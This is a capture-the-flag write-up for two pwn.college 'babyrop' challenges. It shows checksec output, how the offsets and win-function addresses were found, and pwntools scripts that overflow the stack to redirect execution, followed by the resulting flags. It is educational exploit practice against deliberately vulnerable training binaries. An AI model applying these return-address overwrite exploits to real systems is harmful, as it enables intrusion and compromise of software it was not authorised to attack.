# ROP WriteUP

## Setup

first we already have the all tools, like vscode, pwntools and others.

the guide to ROP is actually three things

1. Check security
2. Find the return address
3. Craft payload

## Babyrop 1.0

for this problem first i check the security using `checksec` from `pwn` modules

```txt
[*] '/challenge/babyrop_level1.0'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

because the NX enabled we can't craft a shell code and if we look the PIE is disabled so it should be pretty easy. the challenges is available in the /challenge/babyrop_level1. just run ./babyrop_level1.0 and it gives me

```txt
###
### Welcome to ./babyrop_level1.0!
###

This challenge reads in some bytes, overflows its stack, and allows you to perform a ROP attack. Through this series of
challenges, you will become painfully familiar with the concept of Return Oriented Programming!

In this challenge, there is a win() function.
win() will open the flag and send its data to stdout; it is at 0x4024f9.
In order to get the flag, you will need to call this function.

You can call a function by directly overflowing into the saved return address,
which is stored at 0x7ffc526ad908, 120 bytes after the start of your input buffer.
That means that you will need to input at least 128 bytes (96 to fill the buffer,
24 to fill other stuff stored between the buffer and the return address,
and 8 that will overwrite the return address).

Received 1 bytes! This is potentially -15 gadgets.
Let's take a look at your chain! Note that we have no way to verify that the gadgets are executable
from within this challenge. You will have to do that by yourself.

+--- Printing 4294967282 gadgets of ROP chain at 0x7ffc526ad908.

Leaving!
### Goodbye!
```

after i read the text it just basic overwrite return address. and it even gives me the offset. so i craft the payload

```py
from pwn import *

binary_name = "/challenge/babyrop_level1.0"

p = process(binary_name)

payload = cyclic(120)
payload += p64(0x00000000004024f9)

print(payload)
p.recvuntil(b"address).")
p.sendline(payload)
p.interactive()
```

becuase the 128bytes is including return address so we must subtract it by 8 bytes so the offset is actually 120bytes and we got the flag

```txt
hacker@babyrop_level1:~/babyrop1.0$ python payload.py
[+] Starting local process '/challenge/babyrop_level1.0': pid 273
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaab\xf9$@\x00\x00\x00\x00\x00'
[*] Switching to interactive mode

[*] Process '/challenge/babyrop_level1.0' stopped with exit code -11 (SIGSEGV) (pid 273)
Received 129 bytes! This is potentially 1 gadgets.
Let's take a look at your chain! Note that we have no way to verify that the gadgets are executable
from within this challenge. You will have to do that by yourself.

+--- Printing 2 gadgets of ROP chain at 0x7ffcdca74d28.
| 0x00000000004024f9: endbr64  ; push rbp ; mov rbp, rsp ; lea rdi, [rip + 0xc90] ; call 0x401150 ;
| 0x000000000000000a: (UNMAPPED MEMORY)

Leaving!
You win! Here is your flag:
pwn.college{46d2mczXGy6QmtzEHi5g5RNHKdq.QXxQzMsATO1QzW}
```

## Babyrop 2.0

babyrop2.0 is actually the same as 1.0, first i check the security

```txt
hacker@babyrop_level2:/challenge$checksec babyrop_level2.0
[*] '/challenge/babyrop_level2.0'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
hacker@babyrop_level2:/challenge$
```

The security is the same as the babyrop1.0

then i simply run the program to check what the problem want us to do

```txt
###
### Welcome to ./babyrop_level2.0!
###

This challenge reads in some bytes, overflows its stack, and allows you to perform a ROP attack. Through this series of
challenges, you will become painfully familiar with the concept of Return Oriented Programming!

In this challenge, there are 2 stages of win functions. The functions are labeled `win_stage_1` through `win_stage_2`.
In order to get the flag, you will need to call all of these stages in order.

You can call a function by directly overflowing into the saved return address,
which is stored at 0x7ffd0da28798, 120 bytes after the start of your input buffer.
That means that you will need to input at least 128 bytes (98 to fill the buffer,
22 to fill other stuff stored between the buffer and the return address,
and 8 that will overwrite the return address).

Received 1 bytes! This is potentially -15 gadgets.
Let's take a look at your chain! Note that we have no way to verify that the gadgets are executable
from within this challenge. You will have to do that by yourself.

+--- Printing 4294967282 gadgets of ROP chain at 0x7ffd0da28798.

Leaving!
### Goodbye!
```

the problem statement is very clear and it even gives the debug so yeah :D. it states that you need to run two function win_stage_1, win_stage_2 and then it will give the output. so first i tried to find the address of the function using `readelf`

```txt
hacker@babyrop_level2:/challenge$ readelf -s babyrop_level2.0 | grep win
    65: 0000000000402616   173 FUNC    GLOBAL DEFAULT   15 win_stage_1
    90: 00000000004026c3   177 FUNC    GLOBAL DEFAULT   15 win_stage_2
```

after i got the address i craft the payload same as the 1.0 but with two function

```py
from pwn import *

binary_name = "/challenge/babyrop_level2.0"
win_1 = 0x0000000000402616
win_2 = 0x00000000004026c3

p = process(binary_name)

payload = cyclic(120)
payload += p64(0x0000000000402616)
payload += p64(0x00000000004026c3)

print(payload)
p.recvuntil(b"address).")
p.sendline(payload)
p.interactive()
```

and then we got the payload

```txt
hacker@babyrop_level2:~/babyrop2.0$ python payload.py
[+] Starting local process '/challenge/babyrop_level2.0': pid 690
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaab\x16&@\x00\x00\x00\x00\x00\xc3&@\x00\x00\x00\x00\x00'
[*] Switching to interactive mode

[*] Process '/challenge/babyrop_level2.0' stopped with exit code -11 (SIGSEGV) (pid 690)
Received 137 bytes! This is potentially 2 gadgets.
Let's take a look at your chain! Note that we have no way to verify that the gadgets are executable
from within this challenge. You will have to do that by yourself.

+--- Printing 3 gadgets of ROP chain at 0x7ffc57592328.
| 0x0000000000402616: endbr64  ; push rbp ; mov rbp, rsp ; sub rsp, 0x120 ; mov dword ptr [rbp - 0x114], edi ; mov esi, 0 ; lea rdi, [rip + 0xb61] ; mov eax, 0 ; call 0x401210 ;
| 0x00000000004026c3: endbr64  ; push rbp ; mov rbp, rsp ; sub rsp, 0x120 ; mov dword ptr [rbp - 0x114], edi ; mov esi, 0 ; lea rdi, [rip + 0xab4] ; mov eax, 0 ; call 0x401210 ;
| 0x00007ffc5759240a: add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax + 0x24], al ; pop rcx ; push rdi ; cld  ; jg 0x7ffc57592417 ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rsi + 0x12], bl ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], bh ; and al, 0x59 ; push rdi ; cld  ; jg 0x7ffc57592437 ; add byte ptr [rax + rax], bl ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add dword ptr [rax], eax ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ;

Leaving!
pwn.college{YM0_FN0csMWwjODL95N7Qk6gDHV.QXzQzMsATO1QzW}
```

## Made by gawrgare
